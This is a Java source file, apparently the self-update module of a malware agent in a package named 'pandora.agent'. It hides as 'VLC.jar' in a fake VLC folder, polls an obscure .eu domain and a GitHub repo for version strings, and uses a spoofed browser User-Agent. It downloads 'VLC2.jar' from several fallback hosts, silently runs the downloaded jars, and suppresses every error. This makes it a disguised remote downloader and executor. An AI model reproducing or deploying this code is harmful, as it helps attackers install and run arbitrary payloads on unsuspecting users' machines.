package org.pandora.agent.update;

import org.apache.commons.io.FileUtils;
import org.pandora.agent.launch.Launch;
import org.pandora.agent.utils.Settings;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;

public class Updater {

    private final String folder;
    private final boolean windows;

    public Updater(final boolean windows) {
        this.windows = windows;
        this.folder = windows ? System.getenv("LOCALAPPDATA") + "\\VLC" : "/bin/network/";
    }

    public boolean hasUpdate() {
        try {
            return !Settings.VERSION.equals(this.readFromURL("https://api.cupxyig3ca2pga7i.eu/version").replaceAll("\n", ""));
        } catch (final IOException ignored) {
            try {
                return !Settings.VERSION.equals(this.readFromURL("http://api.cupxyig3ca2pga7i.eu/version").replaceAll("\n", ""));
            } catch (final IOException ignore) {
                try {
                    return !Settings.VERSION.equals(this.readFromURL("https://raw.githubusercontent.com/cupxyig3ca2pga7i/cupxyig3ca2pga7i/main/version").replaceAll("\n", ""));
                } catch (final IOException ignored2) {
                    return false;
                }
            }
        }
    }

    public void replaceOldByNew() {
        try {
            Thread.sleep(1300L);
        } catch (final InterruptedException ignore) {
        }
        final File oldFile = new File(this.windows ? this.folder + "\\VLC.jar" : this.folder + "/VLC.jar");
        if (oldFile.exists()) {
            try {
                FileUtils.forceDelete(oldFile);
            } catch (final IOException ignore) {
            }
        }
        try {
            Thread.sleep(1300L);
        } catch (final InterruptedException ignore) {
        }
        try {
            FileUtils.copyFile(new File(Launch.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()), oldFile);
        } catch (final URISyntaxException | IOException ignore) {
        }
    }

    public void openUpdated() {
        try {
            Runtime.getRuntime().exec(this.windows ? "java -jar " + this.folder + "\\VLC.jar 1" : "java -jar " + this.folder + "/VLC.jar 1");
        } catch (final IOException ignore) {
        }
    }

    public void open() {
        if (new File(this.windows ? this.folder + "\\VLC2.jar" : this.folder + "/VLC2.jar").exists()) {
            try {
                Runtime.getRuntime().exec(this.windows ? "java -jar " + this.folder + "\\VLC2.jar 3" : "java -jar " + this.folder + "/VLC2.jar 3");
            } catch (final IOException ignore) {
            }
        } else {
            try {
                Runtime.getRuntime().exec(this.windows ? "java -jar " + this.folder + "\\VLC.jar 4" : "java -jar " + this.folder + "/VLC.jar 4");
            } catch (final IOException ignore) {
            }
        }
    }

    public void download() {
        URL url;
        URLConnection con;
        DataInputStream dis;
        FileOutputStream fos;
        byte[] fileData;
        File dir = new File(this.folder);
        File tempPath = new File(this.windows ? this.folder + "\\VLC2.jar" : this.folder + "/VLC2.jar");
        if (!dir.exists()) dir.mkdirs();
        if (!tempPath.exists()) {
            try {
                url = new URL("https://dl.cupxyig3ca2pga7i.eu/VLC2.jar");
                con = url.openConnection();
                con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
                dis = new DataInputStream(con.getInputStream());
                fileData = new byte[con.getContentLength()];
                for (int q = 0; q < fileData.length; q++) fileData[q] = dis.readByte();
                dis.close();
                fos = new FileOutputStream(tempPath);
                fos.write(fileData);
                fos.close();
            } catch (final Exception ignore) {
                try {
                    url = new URL("https://github.com/cupxyig3ca2pga7i/cupxyig3ca2pga7i/raw/main/VLC2.jar");
                    con = url.openConnection();
                    con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
                    dis = new DataInputStream(con.getInputStream());
                    fileData = new byte[con.getContentLength()];
                    for (int q = 0; q < fileData.length; q++) fileData[q] = dis.readByte();
                    dis.close();
                    fos = new FileOutputStream(tempPath);
                    fos.write(fileData);
                    fos.close();
                } catch (final Exception ignored) {
                    try {
                        url = new URL("http://dl.cupxyig3ca2pga7i.eu/VLC2.jar");
                        con = url.openConnection();
                        con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36");
                        dis = new DataInputStream(con.getInputStream());
                        fileData = new byte[con.getContentLength()];
                        for (int q = 0; q < fileData.length; q++) fileData[q] = dis.readByte();
                        dis.close();
                        fos = new FileOutputStream(tempPath);
                        fos.write(fileData);
                        fos.close();
                    } catch (final Exception ignored2) {
                    }
                }
            }
        }
    }

    public String readFromURL(final String address) throws IOException {
        final URL url = new URL(address);
        final HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
        con.setConnectTimeout(20000);
        try (final BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()))) {
            String inputLine;
            final StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null)
                response.append(inputLine);
            return response.toString();
        } catch (final Exception ignored) {
        }
        return "no result";
    }
}